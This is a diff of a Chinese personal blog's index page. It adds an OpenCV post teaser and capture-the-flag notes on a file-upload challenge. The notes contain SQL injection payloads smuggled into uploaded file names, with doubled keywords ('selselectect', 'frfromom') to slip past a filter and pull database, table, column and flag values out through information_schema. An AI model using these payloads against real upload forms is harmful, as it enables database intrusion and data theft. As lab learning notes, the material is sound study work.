@@ -154,6 +154,81 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-利用opencv把游戏角色打印到背景图片上" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/09/08/利用opencv把游戏角色打印到背景图片上/">利用opencv把游戏角色打印到背景图片上</a>
+    </h1>
+  
+
+        
+        <a href="/2019/09/08/利用opencv把游戏角色打印到背景图片上/" class="archive-article-date">
+  	<time datetime="2019-09-07T16:16:59.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-08</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>这段时间总是忙到很晚，趁着周末把一个月以来所学的知识记录一下。</p>
+<h3 id="基础知识介绍"><a href="#基础知识介绍" class="headerlink" title="基础知识介绍"></a>基础知识介绍</h3><p>   opencv是一个开源跨平台计算机视觉库，它有java，C++，python的接口，在这里我们就介绍如何通过C++使用opencv进行一些对图片的简单操作。<br>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">C++</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/09/08/利用opencv把游戏角色打印到背景图片上/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-C语言贪吃蛇" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -248,7 +323,16 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <h3 id="解决方式一"><a href="#解决方式一" class="headerlink" title="解决方式一"></a>解决方式一</h3><p>获取当前数据库名：sql ‘+(selselectect CONV(substr(hex(dAtaBase()),1,12),16,10))+’.jpg<br>获取指定数据库中的表名：sql ‘+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = ‘web_upload’ limit 1,1)),1,12),16,10))+’.jpg</p>
+<p>获取列名：sql’+(selselectect+conv(substr(hex((selselectect group_concat(column_name) frfromom information_schema.columns where table_name = ‘hello_flag_is_here’)),1,12),16,10))+’.jpg</p>
+<p>获取字段名：sql’+(seleselectct+conv(substr(hex((seleselectct group_concat(i_am_flag) frfromom hello_flag_is_here)),1,12),16,10))+’.jpg</p>
+<p>!!<a href="mailto:_@m_Th.e_F" target="_blank" rel="noopener">_@m_Th.e_F</a>!lag</p>
+<p>题目还没有理解，只能知道hex()用于将字符转为16进制数，substr的使用是10进制数过大会以指数形式显示，所以最大只能12位16进制数，当然截取的位数为单数也不行，因为一位16进制数占4bit，而一个字母为8bit，两位16进制数可以表示一个字母。</p>
+<h3 id="解决方式二"><a href="#解决方式二" class="headerlink" title="解决方式二"></a>解决方式二</h3><p>(filename.jpg,uid,uid)<br>暂时还没搞清楚这是什么结构</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1. 库名</span><br><span class="line">filename&apos;,&apos;uid&apos;,&apos;uid&apos;),((database()),&apos;uid&apos;,&apos;uid&apos;)#.jpg</span><br><span class="line"># 例：filename&apos;,&apos;1661&apos;,&apos;1661&apos;),((database()),&apos;1661&apos;,&apos;1661&apos;)#.jpg</span><br><span class="line"></span><br><span class="line">2. 表名</span><br><span class="line">filename&apos;,&apos;uid&apos;,&apos;uid&apos;),((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema = &apos;web_upload&apos;),&apos;uid&apos;,&apos;uid&apos;)#.jpg</span><br><span class="line">#&apos;--------------------------------分割行</span><br><span class="line"></span><br><span class="line">3. 字段名</span><br><span class="line">filename&apos;,&apos;uid&apos;,&apos;uid&apos;),((selselectect group_concat(column_name) frfromom information_schema.columns where table_name = &apos;hello_flag_is_here&apos;),&apos;uid&apos;,&apos;uid&apos;)#.jpg</span><br><span class="line">#&apos;--------------------------------分割行</span><br><span class="line"></span><br><span class="line">4. 获得数据</span><br><span class="line">filename&apos;,&apos;uid&apos;,&apos;uid&apos;),((selselectect i_am_flag frfromom hello_flag_is_here),&apos;uid&apos;,&apos;uid&apos;)#.jpg</span><br></pre></td></tr></table></figure>
+
+<p>应该说是</p>
+
       
 
       
@@ -256,6 +340,17 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -386,8 +481,11 @@
       
         <h3 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a>1.概念</h3><p>   information_schema是MySQL自带的数据库，存储了数据库的元数据（关于数据的数据），它里面的表的本质是上是视图。</p>
 <h3 id="2-information-schema中的几个表"><a href="#2-information-schema中的几个表" class="headerlink" title="2.information_schema中的几个表"></a>2.information_schema中的几个表</h3><p>1.schemate<br>SCHEMA_NAME<br>2.tables<br>TABLE_SCHEMA<br>TABLE_NAME<br>3.columns<br>TABLE_SCHEMA<br>TABLE_NAME<br>COLUMN_NAME</p>
-<h3 id="3-利用sql注入获取数据库中的信息"><a href="#3-利用sql注入获取数据库中的信息" class="headerlink" title="3.利用sql注入获取数据库中的信息"></a>3.利用sql注入获取数据库中的信息</h3><p>获取当前数据库名：sql ‘+(selselectect CONV(substr(hex(dAtaBase()),1,12),16,10))+’.jpg<br>获取指定数据库中的表名：sql ‘+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = ‘web_upload’ limit 1,1)),1,12),16,10))+’.jpg<br>file_name’+(seleselectct+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema = ‘web_upload’ limit 1,1)),1,12),16,10))+’.jpg</p>
-<p>sql’ +(selselectect+conv(substr(hex((selselectect column_name frfromom information_schema.columns where table_name=’flag_is_here’ limit 0,1)),1,12),16,10))+’.jpg</p>
+<h3 id="3-利用sql注入获取数据库中的信息"><a href="#3-利用sql注入获取数据库中的信息" class="headerlink" title="3.利用sql注入获取数据库中的信息"></a>3.利用sql注入获取数据库中的信息</h3><p>获取当前数据库名：sql ‘+(selselectect CONV(substr(hex(dAtaBase()),1,12),16,10))+’.jpg<br>获取指定数据库中的表名：sql ‘+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = ‘web_upload’ limit 1,1)),1,12),16,10))+’.jpg</p>
+<p>sql’+(selselectect+conv(substr(hex((selselectect group_concat(column_name) frfromom information_schema.columns where table_name = ‘hello_flag_is_here’)),1,12),16,10))+’.jpg</p>
+<p>filename’,’1660’,’1660’),((selselectect group_concat(column_name) frfromom information_schema.columns where table_name = ‘hello_flag_is_here’),’1660’,’1660’)#.jpg</p>
+<p>sql’+(seleselectct+conv(substr(hex((seleselectct group_concat(i_am_flag) frfromom hello_flag_is_here)),1,12),16,10))+’.jpg</p>
+<p>!!<a href="mailto:_@m_Th.e_F" target="_blank" rel="noopener">_@m_Th.e_F</a>!lag</p>
 
       
 
@@ -850,91 +948,6 @@
 
 
   
-    <article id="post-华为交换机端口镜像配置" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/07/25/华为交换机端口镜像配置/">华为交换机端口镜像配置</a>
-    </h1>
-  
-
-        
-        <a href="/2019/07/25/华为交换机端口镜像配置/" class="archive-article-date">
-  	<time datetime="2019-07-25T02:36:11.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-25</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="端口镜像是指设备复制从端口流经-的报文，并将此报文传送到指定的观察端口进行分析和监控。下面是配置本地端口镜像的例子："><a href="#端口镜像是指设备复制从端口流经-的报文，并将此报文传送到指定的观察端口进行分析和监控。下面是配置本地端口镜像的例子：" class="headerlink" title="端口镜像是指设备复制从端口流经 的报文，并将此报文传送到指定的观察端口进行分析和监控。下面是配置本地端口镜像的例子："></a>端口镜像是指设备复制从端口流经 的报文，并将此报文传送到指定的观察端口进行分析和监控。下面是配置本地端口镜像的例子：</h2>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">网络配置</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/网络//" class="article-tag-list-link color3">网络</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/07/25/华为交换机端口镜像配置/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
@@ -1034,7 +1047,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">ctf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">安装配置</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">linux</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1046,11 +1067,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">安全</a>
+                <a href="javascript:void(0)" class="js-tag color4">C++</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">linux</a>
+                <a href="javascript:void(0)" class="js-tag color5">网络配置</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1058,7 +1079,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">网络配置</a>
+                <a href="javascript:void(0)" class="js-tag color3">安全</a>
               </li>
             
             <div class="clearfix"></div>
